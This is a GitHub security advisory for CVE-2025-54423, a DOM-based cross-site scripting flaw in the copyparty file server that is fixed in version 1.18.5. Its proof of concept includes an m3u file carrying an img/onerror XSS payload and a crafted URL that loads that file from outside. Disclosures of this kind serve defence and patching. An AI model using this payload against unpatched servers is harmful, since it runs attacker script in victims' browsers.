# [M] copyparty has DOM-Based XSS vulnerability when displaying multimedia metadata

## Summary
Severity: Medium
Advisory: GHSA-9q4r-x2hj-jmvr
CVE: CVE-2025-54423
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2025-07-28
Source: https://github.com/advisories/GHSA-9q4r-x2hj-jmvr
Type: github-advisory

## Affected
- PyPI: `copyparty` — affected >=0 <1.18.5

## Details
### Summary

An unauthenticated attacker is able to execute arbitrary JavaScript code in a victim's browser due to improper sanitization of multimedia tags in music files, including `m3u` files.

### Details

Multimedia metadata is rendered in the web-app without sanitization. This can be exploited in two ways:

* a user which has the necessary permission for uploading files can upload a song with an artist-name such as `<img src=x onerror=alert(document.domain)>`
* an unauthenticated user can trick another user into clicking a malicious URL, performing this same exploit using an externally-hosted m3u file

The CVE score and PoC is based on the m3u approach, which results in a higher severity.

### PoC
1.  Create a file named `song.m3u` with the following content. Host this file on an attacker-controlled web server.

    ```m3u
    #EXTM3U
    #EXTINF:1,"><img src=x onerror=alert(document.domain)> - "><img src=x onerror=alert(document.domain)>
    http://example.com/audio.mp3
    ```

2.  Craft and share the malicious URL:  

    ```
    http://127.0.0.1:3923/#m3u=https://example.com/song.m3u
    ```


### Impact
Any user that accesses this malicious URL is impacted.

## References
- https://github.com/9001/copyparty/security/advisories/GHSA-9q4r-x2hj-jmvr
- https://nvd.nist.gov/vuln/detail/CVE-2025-54423
- https://github.com/9001/copyparty/commit/895880aeb0be0813ddf732487596633f8f9fc3a6
- https://github.com/9001/copyparty
- https://github.com/9001/copyparty/releases/tag/v1.18.5
